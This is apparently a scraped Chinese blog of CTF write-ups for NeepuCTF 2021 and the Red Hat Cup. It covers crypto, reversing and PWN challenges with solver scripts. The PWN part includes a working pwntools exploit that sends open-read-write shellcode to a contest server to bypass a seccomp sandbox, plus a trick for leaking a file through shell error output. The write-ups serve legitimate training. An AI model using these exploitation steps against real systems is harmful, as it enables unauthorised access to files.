78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671for k in range(1,10000): if (e*dp-1)%k == 0: p = (e*dp-1)//k-1 if n%p == 0: q = n//p print((k,p,q)) 最后常规RSA求得flag。 ​ AES 简单的AES 1234567891011121314151617181920212223from Crypto.Cipher import AESimport osfrom Crypto.Util.number import *flag = os.urandom(18)flag_enc = os.urandom(45)pad = b&#x27;a&#x27; * 12 + b&#x27;Neepu&#123;&#x27;flag_enc = pad+flag_enc+b&#x27;&#125;&#x27;masg1 = flag_enc[0:32]masg2 = flag_enc[32: ]m = bytes_to_long(masg1)^bytes_to_long(masg2)key = os.urandom(2)*16iv = masg2[16:][:16]print(bytes_to_long(key)^bytes_to_long(iv))aes = AES.new(key,AES.MODE_CBC,iv)enc_flag = aes.encrypt(long_to_bytes(m))print(enc_flag)&#x27;&#x27;&#x27;111074535590201916919246051309547040927554959486196038152130336189953949145068b&#x27;\\xd8\\x83\\xfd\\x89\\xc3+\\x11\\xb8g\\xd2\\xf5k\\xeeU\\x88\\xb5\\xde\\x8bq\\x9bC\\xab\\xe3K2R&lt;\\xaa\\xbc\\x92H\\x19&#x27;&#x27;&#x27;&#x27; 先看flag_enc由64字符构成，已知前18字符 aaaaaaaaaaaaNeepu&#123; 和后1字符 &#125; 。 拆半分别为前32字符 masg1 和后32字符 masg2，异或值 m = masg1^masg2， 通过AES-CBC加密，key形如 xyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxy，iv为 masg2 后16字符，已知 key^iv。 从key入手，key只有两位未知，爆破key值，同时得到iv值，利用iv值16位和最后1位字符为&#125;，得到key和iv值： 1234567891011tmp=111074535590201916919246051309547040927554959486196038152130336189953949145068for i in range(256): for j in range(256): key = bytes([i,j])*16 iv = long_to_bytes(tmp^bytes_to_long(key)) if len(iv) == 16 and iv[-1] == ord(&#x27;&#125;&#x27;): print(iv) print(key)#iv: b&#x27;fefcsukobhmtfhb&#125;&#x27;#key: b&#x27;\\xf5\\x91&#x27;*16 由key和iv值+密文 enc 解出 m。 此时，前32字符 masg1 已知前16字符aaaaaaaaaaaaNeep，后32字符 masg2 已知后16字符 fefcsukobhmtfhb&#125;，根据 m = masg1^masg2 分别异或得到另一半： 1234567891011iv = b&#x27;fefcsukobhmtfhb&#125;&#x27;key = b&#x27;\\xf5\\x91&#x27;*16aes = AES.new(key,AES.MODE_CBC,iv)m = aes.decrypt(enc)print(m)masg1 = (b&#x27;a&#x27;*12 + b&#x27;Neep&#x27;) + long_to_bytes(bytes_to_long(iv)^bytes_to_long(m[16:]))masg2 = long_to_bytes(bytes_to_long(b&#x27;a&#x27;*12+b&#x27;Neep&#x27;)^bytes_to_long(m[:16])) + ivflag_enc = masg1 + masg2#aaaaaaaaaaaaNeepu&#123;qszeftwdr-thuilpyji-ijlmukoescfefcsukobhmtfhb&#125; 发现代码里 flag 和 flag_enc 无直接关联，观察 flag_enc为键盘加密，解密得 flag：Neepu&#123;are-you-kidding&#125;。 ​ REOLLEH !ni ngis ER laeR hint: 师傅们如果做出来了请将flag框架改为Neepu{}，给师傅们带来不便，非常抱歉 IDA，main()： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849_main();strcpy((char *)v20, &quot;416:99A:77&quot;); //字符串v20 = 416:99A:77v20[6] = 0;LOBYTE(v20[7]) = 0;memset(v14, 0, sizeof(v14));v14[0] = 1;v14[1] = 1;for ( i = 2; i &lt;= 19; ++i ) //v14 = 长度20的斐波那契数列 v14[i] = v14[i - 2] + v14[i - 1];for ( i = 0; i &lt;= 9; ++i ) //v20按 (斐波那契数列值 &amp; 0xF) 移位，存入v4 = 3047414550 *(&amp;v4 + i) = *((char *)v20 + i) - (v14[i] &amp; 0xF);v17[0] = &#x27;OLLEH&#x27;; //v17 = HELLOv17[1] = 0i64;v18 = 0;strcpy(v15, &quot;flag&#123;world_Vjea&#125;&quot;); //v15 = flag&#123;world_Vjea&#125;for ( j = 0; j &lt;= 4; ++j ) v16[j] = *((_BYTE *)v17 + j); //v16[0:5] = v17[0:5] = HELLOfor ( j = 5; j &lt;= 9; ++j ) v16[j] = v15[j]; //v16[5:10] = v15[5:10] = worldputs(&quot;Welcome to the 2021 NEEPUCTF&quot;);puts(&quot;Now you can enjoy it&quot;);puts(&quot;Please input right number:&quot;);scanf(&quot;%s&quot;, Str);v21 = strlen(Str);if ( v21 != 10 )&#123; puts(&quot;Try again&quot;); exit(0);&#125;if ( v4 == Str[0] &amp;&amp; v5 == Str[1] &amp;&amp; v6 == Str[2] &amp;&amp; v7 == Str[3] &amp;&amp; v8 == Str[4] &amp;&amp; v9 == Str[5] &amp;&amp; v10 == Str[6] &amp;&amp; v11 == Str[7] &amp;&amp; v12 == Str[8] &amp;&amp; v13 == Str[9] ) //Str == v4&#123; printf(&quot;OK,FLAG is NEEPU&#123;MD5&#123;%s%d%d%d%d%d&#125;&#125;&quot;, v16, v4, v5, v6, v7, v8); getchar();&#125;else&#123; puts(&quot;byebye&quot;);&#125;system(&quot;pause&quot;);return 0; 按代码逻辑，拼接得 v16 = HeLLOworld，v4~v8 = 30474，由于 v4~v8 格式化输出为 %d，转化为对应ASCII值。 flag得到：Neepu&#123;md5(HeLLOworldworld5148525552)&#125; ​ ez_re ezRE, wryyyyy~ 两个文件，easyre.dll 和 easyre.exe。 exeinfope查看easyre.dll，发现是.NET程序，上ILSpy： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576// retest.Programinternal class Program&#123; private static void Main(string[] args) &#123; string text = &quot;mT0b&quot;; string text2 = &quot;D&#123;0S&quot;; string text3 = &quot;Dg9E&quot;; string text4 = &quot;OD_&#125;&quot;; char[] array = new char[4]; char[] array2 = new char[4]; char[] array3 = new char[4]; char[] array4 = new char[4]; array[0] = text.get_Chars(0); array[1] = text2.get_Chars(0); array[2] = text3.get_Chars(0); array[3] = text4.get_Chars(0); array2[0] = text.get_Chars(1); array2[1] = text2.get_Chars(1); array2[2] = text3.get_Chars(1); array2[3] = text4.get_Chars(1); array3[0] = text.get_Chars(2); array3[1] = text2.get_Chars(2); array3[2] = text3.get_Chars(2); array3[3] = text4.get_Chars(2); array4[0] = text.get_Chars(2); array4[1] = text2.get_Chars(2); array4[2] = text3.get_Chars(2); array4[3] = text4.get_Chars(2); Encrypt1(array); Encrypt1(array2); Encrypt1(array3); Encrypt1(array4); &#125; public static void Encrypt1(char[] string1) &#123; int num = string1.Length; for (int i = 0; i &lt; num; i++) &#123; if (string1[i] &gt;= &#x27;a&#x27; &amp;&amp; string1[i] &lt;= &#x27;z&#x27;) &#123; if (string1[i] &gt;= &#x27;a&#x27; &amp;&amp; string1[i] &lt;= &#x27;y&#x27;) &#123; string1[i] = (char)(string1[i] - 31); &#125; else &#123; string1[i] = &#x27;A&#x27;; &#125; &#125; else if (string1[i] &gt;= &#x27;A&#x27; &amp;&amp; string1[i] &lt;= &#x27;Z&#x27;) &#123; if (string1[i] &gt;= &#x27;A&#x27; &amp;&amp; string1[i] &lt;= &#x27;Y&#x27;) &#123; string1[i] = (char)(string1[i] + 33); &#125; else &#123; string1[i] = &#x27;a&#x27;; &#125; &#125; else if (string1[i] &gt;= &#x27;0&#x27; &amp;&amp; string1[i] &lt;= &#x27;9&#x27;) &#123; if (string1[i] == &#x27;9&#x27;) &#123; string1[i] = &#x27;0&#x27;; &#125; else &#123; string1[i] = (char)(string1[i] + 1); &#125; &#125; &#125; &#125;&#125; 看Main()，按逻辑得 array1~4 分别为 mDDO,T&#123;gD,009_,bSE&#125;，再看Encrypt1()，a-z移位-31，A-Z移位33，0-9 移位1，操作后得 Neepu&#123;He110_Ctf&#125;。 ​ login login in please :) login文件夹里包含usrs_info2.pickle序列化文件，确定是python程序。 pyinstxtractor解包exe为pyc，再uncompyle6反编译retest2.pyc为python源码，找到flag。 ​ ppap 最近小猫爱上了闯关 查壳发现upx壳，工具脱壳。 IDA，main()： 123456789101112131415161718192021222324252627282930313233343536 sub_40DA40();LABEL_2: puts(&quot;ppap&quot;); puts(&quot;The cat is very cute, do you like it?&quot;); puts(&quot;My cat is lost, help me&quot;); puts(&quot;please input your cat&#x27;s name&#x27;&quot;); puts(&quot;tell me 1+2=?&quot;); scanf(&quot;%256s\\n&quot;, Str); //输入字符串 v3 = strlen(Str); v11 = (const char *)sub_401500(Str, v3); //v11 = 输入字符串的base64编码（自定义码表） for ( i = 0; ; ++i ) &#123; v4 = i; if ( v4 &gt;= strlen(v11) ) break; v7[i] = v11[i]; //v7 = v11 &#125; strcpy(v8, &quot;WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc&quot;); //v8 = WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc memset(v9, 0, sizeof(v9)); sub_40167D(v7); //对v7做第一次处理，函数sub_40167D() sub_401746(v7); //对v7做第二次处理，函数sub_401746() for ( j = 0; ; ++j ) &#123; v5 = j; if ( v5 &gt;= strlen(v7) ) break; if ( v7[j] != v8[j] ) //比较v7 == v8？ &#123; printf(&quot;ppap&quot;); goto LABEL_2; &#125; &#125; puts(&quot;Yes, you are right&quot;); system(&quot;pause&quot;); return 0; 函数 sub_40167D()： 123456789101112131415161718192021char *__cdecl sub_40167D(char *Str)&#123; size_t i; // [esp+1Ch] [ebp-Ch] strlen(Str); for ( i = 0; i &lt; strlen(Str); ++i ) &#123; if ( Str[i] &lt;= 64 || Str[i] &gt; 90 ) &#123; if ( Str[i] &lt;= 96 || Str[i] &gt; 122 ) Str[i] = Str[i]; else Str[i] -= 32; //96&lt;字符ascii值&lt;=122，字符移位 &#125; else &#123; Str[i] += 32; //64&lt;字符ascii值&lt;=90，字符移位 &#125; &#125; return Str;&#125; 函数 sub_401746()： 123456789101112131415161718char *__cdecl sub_401746(char *Str)&#123; size_t i; // [esp+1Ch] [ebp-Ch] for ( i = 0; i &lt; strlen(Str); ++i ) &#123; if ( Str[i] &lt;= 64 || Str[i] &gt; 90 ) &#123; if ( Str[i] &gt; 96 &amp;&amp; Str[i] &lt;= 122 ) Str[i] = (Str[i] - 97 + 3) % 26 + 97; //96&lt;字符ascii值&lt;=122，字符循环移位 &#125; else &#123; Str[i] = (Str[i] - 65 + 3) % 26 + 65; //64&lt;字符ascii值&lt;=90，字符循环移位 &#125; &#125; return Str;&#125; 将 v8 字符串先按函数 sub_401746()还原，再按函数 sub_40167D()还原： 123456789101112131415161718192021222324252627282930313233343536s=&#x27;WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc&#x27;s=list(s.encode())t=[-1]*len(s)tt=[-1]*len(s)for i in range(len(s)): for j in range(32,128): c=j if c&lt;=64 or c&gt;90: if c&gt;96 and c&lt;=122: c=(c-97+3)%26+97 else: c=(c-65+3)%26+65 if c==s[i]: t[i]=j break for i in range(len(t)): for j in range(32,128): c=j if c&lt;=64 or c&gt;90: if c&lt;=96 or c&gt;122: c=c else: c-=32 else: c+=32 if c==t[i]: tt[i]=j break print(bytes(tt))#解密得密文：tCvB2hvXuS77mvZQytf5wwfKzRZezvZUmweMxSN71BZJyub54wfZ#自定义码表：a-z0-9A-Z+/= 解自定义码表下的base64得flag。 ​ ez Do you like basketball? IDA，main()： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081sub_40E3F0();puts(&quot;Do you like basketball?&quot;);scanf(&quot;%s&quot;, Source); //输入字符串Sourcestrcpy(Destination, Source); //Dest = Sourcememset(v7, 0, sizeof(v7));memset(v8, 0, 0x80u);sub_40235D(Source, v7, &quot;flag&#123;Would_you_like_basketball?&#125;&quot;); //函数sub_40235D(Source,out,key) （RC4+base64）v28 = 32;v24[0] = 2;v24[1] = 2;v24[2] = 3;v24[3] = 4; //v24 = [2,2,3,4]puts(&quot;please input your lucky number&quot;);for ( i = 0; i &lt;= 1; ++i ) scanf(&quot;%d&quot;, &amp;v25 + i); //输入v25,v26for ( j = 0; j &lt;= 1; ++j ) scanf(&quot;%d&quot;, &amp;v22 + j); //输入v22,v23for ( k = 0; k &lt;= 1; ++k ) scanf(&quot;%d&quot;, &amp;v20 + k); //输入v20,v21for ( l = 0; l &lt;= 1; ++l ) scanf(&quot;%d&quot;, &amp;v18 + l); //输入v18,v19v4[0] = v25;v4[1] = v26;v4[2] = v22;v4[3] = v23;v4[4] = v20;v4[5] = v21;v4[6] = v18;v4[7] = v19; //v4 = [v25,v26,v22,v23,v20,v21,v18,v19]for ( m = 0; m &lt;= 7; ++m ) //对v4冒泡排序（升序）&#123; for ( n = 7; n &gt; m; --n ) &#123; if ( v4[n] &lt; v4[n - 1] ) &#123; v27 = v4[n]; v4[n] = v4[n - 1]; v4[n - 1] = v27; &#125; &#125;&#125;sub_40152F(&amp;v25, v24); //函数sub_40152F() （TEA加密）sub_40152F(&amp;v22, v24); //函数sub_40152F() （TEA加密）sub_4015FD(v28, &amp;v20, v24); //函数sub_4015FD() （XTEA加密）sub_4015FD(v28, &amp;v18, v24); //函数sub_4015FD() （XTEA加密）memset(v9, 0, sizeof(v9));v9[0] = 81; //v9v9[1] = 116;......v9[46] = 7;v9[47] = 8;v16 = -1621115832; //v10~v17，8个hexv17 = -984516975;v14 = 616429839;v15 = 807110888;v12 = -1837822886;v13 = -1596355058;v10 = -1915738221;v11 = 1331005540;if ( v25 != -1621115832 //v25,v26,v22,v23,v20,v21,v18,v19 == v10~v17 || v26 != v17 || v14 != v22 || v15 != v23 || v12 != v20 || v13 != v21 || v10 != v18 || v11 != v19 )&#123; printf(&quot;you are wrong&quot;); exit(0);&#125;for ( ii = 0; ii &lt;= 47; ++ii ) *(_DWORD *)&amp;v8[4 * ii + 128] = v4[ii % 8] ^ v7[ii]; //v8 = v4^v7 for ( jj = 0; jj &lt;= 47; ++jj )&#123; if ( v9[jj] != *(_DWORD *)&amp;v8[4 * jj + 128] ) //v9 == v8？ exit(0);&#125;printf(&quot;Right,FLAG is Neepu&#123;%s&#125;\\n&quot;, Destination);system(&quot;PAUSE&quot;);return 0; 函数 sub_40235D(Source,out,key)： 123456789101112131415161718192021222324252627282930void __cdecl sub_40235D(char *Str, void *a2, char *a3)&#123; void *Src; // [esp+1Ch] [ebp-1Ch] BYREF size_t Size; // [esp+20h] [ebp-18h] BYREF void *Block; // [esp+24h] [ebp-14h] size_t v6; // [esp+28h] [ebp-10h] size_t v7; // [esp+2Ch] [ebp-Ch] if ( Str &amp;&amp; a2 &amp;&amp; a3 ) &#123; v7 = strlen(Str); v6 = strlen(a3); Block = (void *)sub_418710(v7 + 1); //初始化Block memcpy(Block, Str, v7 + 1); sub_401E22(Block, v7, a3, v6); //RC4加密，Block = RC4(Str,key) Size = 0; Src = 0; sub_4020DE(Block, v7, (int)&amp;Src, (int)&amp;Size); //Src = Block的base64编码（自定义码表） if ( Src ) &#123; memcpy(a2, Src, Size); //a2 = Src *((_BYTE *)a2 + Size) = 0; if ( Src ) j_j_free(Src); Src = 0; &#125; if ( Block ) j_j_free(Block); &#125;&#125; 函数 sub_40152F()： 12345678910111213141516171819202122unsigned int __cdecl sub_40152F(unsigned int *a1, _DWORD *a2) //TEA加密算法&#123; unsigned int result; // eax unsigned int i; // [esp+20h] [ebp-10h] int v4; // [esp+24h] [ebp-Ch] unsigned int v5; // [esp+28h] [ebp-8h] unsigned int v6; // [esp+2Ch] [ebp-4h] v6 = *a1; v5 = a1[1]; v4 = 0; for ( i = 0; i &lt;= 0x1F; ++i ) &#123; v4 -= 1640531527; v6 += (v5 + v4) ^ (16 * v5 + *a2) ^ ((v5 &gt;&gt; 5) + a2[1]); v5 += (v6 + v4) ^ (16 * v6 + a2[2]) ^ ((v6 &gt;&gt; 5) + a2[3]); &#125; *a1 = v6; result = v5; a1[1] = v5; return result;&#125; 函数 sub_4015FD()： 12345678910111213141516171819202122unsigned int __cdecl sub_4015FD(unsigned int a1, unsigned int *a2, int a3) //XTEA算法&#123; unsigned int result; // eax unsigned int v4; // [esp+10h] [ebp-10h] unsigned int v5; // [esp+14h] [ebp-Ch] unsigned int v6; // [esp+18h] [ebp-8h] unsigned int i; // [esp+1Ch] [ebp-4h] v6 = *a2; v5 = a2[1]; v4 = 0; for ( i = 0; i &lt; a1; ++i ) &#123; v6 += (((v5 &gt;&gt; 5) ^ (16 * v5)) + v5) ^ (*(_DWORD *)(4 * (v4 &amp; 3) + a3) + v4); v4 -= 1640531527; v5 += (((v6 &gt;&gt; 5) ^ (16 * v6)) + v6) ^ (*(_DWORD *)(4 * ((v4 &gt;&gt; 11) &amp; 3) + a3) + v4); &#125; *a2 = v6; result = v5; a2[1] = v5; return result;&#125; 根据上面逻辑，先利用TEA和XTEA解密算法由 v10~v17 解密得到初始值 v25,v26,v22,v23,v20,v21,v18,v19： 12345678910111213141516171819202122232425#TEA解密def decrypt(v, k): v0 = v[0] v1 = v[1] x = 0xC6EF3720 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: encrypted = key = [2, 2, 3, 4] decrypted = decrypt(encrypted, key) print(decrypted) 12345678910111213141516171819202122#XTEA解密def decrypt(rounds, v, k): v0 = v[0] v1 = v[1] delta = 0x9E3779B9 x = delta * rounds for i in range(rounds): v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) v0 = v0 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: encrypted = key = [2, 2, 3, 4] rounds = 32 decrypted = decrypt(rounds, encrypted, key) print(decrypted) 结果： 1234[0x9F5FBC48,0xC5517691] -&gt; [1,1][0x24BDF90F,0x301B88E8] -&gt; [3,4][0x92750C5A,0xA0D98E0E] -&gt; [2,5][0x8DD02793,0x4F558864] -&gt; [8,7] 故 v4 = [1,1,2,3,4,5,7,8]，又 v9 = v8 = v4^v7，异或得到 v7，先base64解码再RC4解密可得输入的 Source 值，即为flag。 ​ PWNncc 经典nc! PWN题连接方式: nc neepusec.club 端口 ls / 发现目录下有 /flag，但没有 cat 等常见的查看文件内容命令。 cd /bin 进到 /bin 目录下，ls 发现目录下有 sh 脚本执行命令，直接 sh /flag 利用报错泄露 /flag 文件内容。 ​ easy_shellcode easy shellcode? flag在./flag checksec发现无任何保护，IDA查看： 1234567891011__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; void *buf; // [rsp+0h] [rbp-10h] sub_9C3(a1, a2, a3); buf = (void *)(int)mmap((void *)0x23330000, 0x1000uLL, 7, 34, -1, 0LL); puts(&quot;just learn orw&quot;); read(0, buf, 0x200uLL); ((void (*)(void))buf)(); return 0LL;&#125; 函数 sub_9C3(a1,a2,a3)： 12345678unsigned int sub_9C3()&#123; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); sub_8CA(); return alarm(0x3Cu);&#125; 函数 sub_8CA()： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061unsigned __int64 sub_8CA()&#123; __int16 v1; // [rsp+0h] [rbp-50h] BYREF __int16 *v2; // [rsp+8h] [rbp-48h] __int16 v3; // [rsp+10h] [rbp-40h] BYREF char v4; // [rsp+12h] [rbp-3Eh] char v5; // [rsp+13h] [rbp-3Dh] int v6; // [rsp+14h] [rbp-3Ch] __int16 v7; // [rsp+18h] [rbp-38h] char v8; // [rsp+1Ah] [rbp-36h] char v9; // [rsp+1Bh] [rbp-35h] int v10; // [rsp+1Ch] [rbp-34h] __int16 v11; // [rsp+20h] [rbp-30h] char v12; // [rsp+22h] [rbp-2Eh] char v13; // [rsp+23h] [rbp-2Dh] int v14; // [rsp+24h] [rbp-2Ch] __int16 v15; // [rsp+28h] [rbp-28h] char v16; // [rsp+2Ah] [rbp-26h] char v17; // [rsp+2Bh] [rbp-25h] int v18; // [rsp+2Ch] [rbp-24h] __int16 v19; // [rsp+30h] [rbp-20h] char v20; // [rsp+32h] [rbp-1Eh] char v21; // [rsp+33h] [rbp-1Dh] int v22; // [rsp+34h] [rbp-1Ch] __int16 v23; // [rsp+38h] [rbp-18h] char v24; // [rsp+3Ah] [rbp-16h] char v25; // [rsp+3Bh] [rbp-15h] int v26; // [rsp+3Ch] [rbp-14h] unsigned __int64 v27; // [rsp+48h] [rbp-8h] v27 = __readfsqword(0x28u); v3 = 32; v4 = 0; v5 = 0; v6 = 4; v7 = 21; v8 = 0; v9 = 2; v10 = -1073741762; v11 = 32; v12 = 0; v13 = 0; v14 = 0; v15 = 21; v16 = 0; v17 = 1; v18 = 59; v19 = 6; v20 = 0; v21 = 0; v22 = 0; v23 = 6; v24 = 0; v25 = 0; v26 = 2147418112; v1 = 6; v2 = &amp;v3; prctl(38, 1LL, 0LL, 0LL, 0LL); prctl(22, 2LL, &amp;v1); return __readfsqword(0x28u) ^ v27;&#125; 在函数 sub_8CA() 发现 prctl() 函数。 prctl是基本的进程管理函数，最原始的沙箱规则就是通过prctl函数来实现的，它可以决定有哪些系统调用函数可以被调用，哪些系统调用函数不能被调用。 沙箱(Sandbox)是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限。seccomp是内核中的一种安全机制，seccomp可以在程序中禁用掉一些系统调用来达到保护系统安全的目的，seccomp规则的设置，可以使用prctl函数和seccomp函数族。 使用 seccomp-tools dump ./pwn 看下哪些函数可用： 发现只要不是 execve() 都可以使用，使用 open-&gt;read-&gt;write 这样的orw的方式获取flag。 mmap() 把从0x23330000开始的地址，大小为0x1000的长度，权限改为可写可执行。 所以只需要写入orw类型的shellcode，然后跳转执行： 12345678910from pwn import *context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;p = remote(&#x27;neepusec.club&#x27;, 18146)mmap = 0x23330000orw_payload = shellcraft.open(&#x27;./flag&#x27;) #打开根目录下的flag文件orw_payload += shellcraft.read(3,mmap,0x50) #读取文件标识符是3的文件0x50个字节存放到mmap分配的地址空间里orw_payload += shellcraft.write(1,mmap,0x50) #将mmap地址上的内容输出0x50个字节p.sendlineafter(&#x27;orw\\n&#x27;, asm(orw_payload))p.interactive()","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"第四届红帽杯网络安全大赛","slug":"match-第四届红帽杯网络安全大赛","date":"2021-05-09T10:20:01.000Z","updated":"2021-12-05T18:13:22.333Z","comments":true,"path":"2021/05/09/match-第四届红帽杯网络安全大赛/","permalink":"https://lazzzaro.github.io/2021/05/09/match-%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"​ 这一届的misc+crypto也太少了，一二血同队+垂直上分明显。 Misc签到下载附件EBCDIC.txt，根据文件名和内容，猜测为某种编码方式，搜索知为EBCDIC编码： EBCDIC（广义二进制编码的十进制交换码，Extended Binary Coded Decimal Interchange Code），是字母或数字字符的二进制编码，是IBM为它的更大型的操作系统而开发的。它是为IBM的S/390上的IBMOS/390操作系统上使用的文本文件的编码，并且数千个公司为它们的遗留应用程序和数据库使用这种编码。在一个EBCDIC的文件里，每个字母或数字字符都被表示为一个8位的二进制数（一个0、1字符串）。256个可能的字符被定义（字母，数字和一些特殊字符）。IBM的个人计算机和工作站操作系统不使用它们所有的EBCDIC编码。相反的，它们使用文本的工业标准编码，ASCII码。转化程序允许不同的操作系统从一种编码到另一种编码的转化。 找到在线解码网站，将16进制EBCDIC码解码为16进制ASCII码，再转为字符得到flag。 flag值：flag{we1c0me_t0_redhat2021} ​ Cryptoprimegame 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python3from decimal import *import mathimport randomimport structfrom flag import flagassert (len(flag) == 48)msg1 = flag[:24]msg2 = flag[24:]primes = [2]for i in range(3, 90): f = True for j in primes: if i * i &lt; j: break if i % j == 0: f = False break if f: primes.append(i)getcontext().prec = 100keys = []for i in range(len(msg1)): keys.append(Decimal(primes[i]).ln())sum_ = Decimal(0.0)for i, c in enumerate(msg1): sum_ += c * Decimal(keys[i])ct = math.floor(sum_ * 2 ** 256)print(ct)sum_ = Decimal(0.0)for i, c in enumerate(msg2): sum_ += c * Decimal(keys[i])ct = math.floor(sum_ * 2 ** 256)print(ct)597952043660446249020184773232983974017780255881942379044454676980646417087515453425985475047781336789963300910446852783032712598571885345660550546372063410589918 代码逻辑： 将48长度的flag分为24长度两部分，生成90以内的素数列表primes和前24个素数自然对数列表keys，分别求出flag两部分的ascii值与key值乘积和。 容易看出 $S=\\text{ct} \\cdot 2^{256}=\\sum\\limits_{i=1}^{24}\\Big(c_i \\cdot (\\text{key}_i \\cdot 2^{256})\\Big)=\\sum\\limits_{i=1}^{24}(c_i \\cdot k_i)$ 形式类似于0-1背包加密问题，其中公钥 $k_i$ 与密文 $S$ 已知，需解密得明文 $c_i \\in [0,128)$。 由于明文数量不大，且背包密度 $d = \\cfrac{n}{\\log_2(\\text{max}(k_i))} \\approx 0.0968$，可采用低密度攻击方法（Lagarias&amp;Odlyzko算法 或 CJLOSS算法）恢复明文，构造格： $\\left(\\begin {array}{c} b_0 \\newline b_1 \\newline \\vdots \\newline b_n \\newline b_{n+1} \\end{array} \\right) =\\left(\\begin {array}{c} 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; Nk_0 \\newline 0 &amp; 1 &amp; \\cdots &amp; 0 &amp; Nk_1 \\newline \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\newline 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; Nk_n \\newline 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; Nk_{n+1} \\end{array} \\right) $ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from itertools import combinationsfrom decimal import Decimal, getcontextimport randomimport structprimes = [2]for i in range(3, 100): f = True for j in primes: if i * i &lt; j: break if i % j == 0: f = False break if f: primes.append(i)getcontext().prec = int(100)keys = []for i in range(len(primes)): keys.append(int(Decimal(int(primes[i])).ln() * (2 ** 256)))n = len(keys)d = n / log(max(keys), 2)assert CDF(d) &lt; 0.9408M = Matrix.identity(n)last_row = [0 for x in keys]M_last_row = Matrix(ZZ, 1, len(last_row), last_row)ct = &#x27;597952043660446249020184773232983974017780255881942379044454676980646417087515453&#x27;# ct = &#x27;425985475047781336789963300910446852783032712598571885345660550546372063410589918&#x27;last_col = keys[:]last_col.append(ct)M_last_col = Matrix(ZZ, len(last_col), 1, last_col)M = M.stack(M_last_row)M = M.augment(M_last_col)X = M.LLL()target = X[0][:-1]flag = [-k for k in target]print(bytes(flag).strip(b&#x27;\\x00&#x27;))#结果#b&#x27;flag&#123;715c39c3-1b46-4c23-&#x27;#b&#x27;8006-27b43eba2446&#125;&#x27; flag值：flag{715c39c3-1b46-4c23-8006-27b43eba2446} ​ hpcurve 你的数学学的怎么样？ 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env sageimport structfrom random import SystemRandomp = 10000000000000001119R.&lt;x&gt; = GF(p)[]y=xf = y + y^7C = HyperellipticCurve(f, 0)J = C.jacobian()es = [SystemRandom().randrange(p**3) for _ in range(3)]Ds = [J(C(x, min(f(x).sqrt(0,1)))) for x in (11,22,33)]q = []def clk(): global Ds,es Ds = [e*D for e,D in zip(es, Ds)] return Dsdef generate(): u,v = sum(clk()) rs = [u[i] for i in range(3)] + [v[i] for i in range(3)] assert 0 not in rs and 1 not in rs q = struct.pack(&#x27;&lt;&#x27;+&#x27;Q&#x27;*len(rs), *rs) return qflag = &quot;flag&#123;xxxxxxx&#125;&quot;text = &#x27;a&#x27;*20+flagt = &#x27;&#x27;keys = generate()leng = len(keys)i = 0for x in text: t += chr(ord(keys[i%leng])^^ord(x)) i+=1print t.encode(&#x27;hex&#x27;)66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5 代码逻辑： 密文为flag与超椭圆曲线 $y^2=x+x^7$ 随机生成值异或得到，由于部分明文已知，通过随机生成器(RNG)部分的代码恢复剩余字符。 对于域 $K$，亏格为 $g$ 超椭圆曲线基本形式是 $C:y^2+h(x)y=f(x)$，其中 $h(x),f(x) \\in K[x]$（多项式系数都在 $K$ 上），且 $\\deg(h(x)) \\leq g$，$\\deg(f(x))=2g+1$。 超椭圆曲线密码体制是建立在超椭圆曲线的Jacobian群上的，有限域上超椭圆曲线的Jacobian群是一个有限交换群，Jacobian阶记为 $J(C)$。可以在 $J(C)$中定义归约除子的一个加法运算 。使得 $J(C)$成为一个交换群，这个有限交换群是超椭圆曲线密码体制的基础。 每个元素 $D \\in 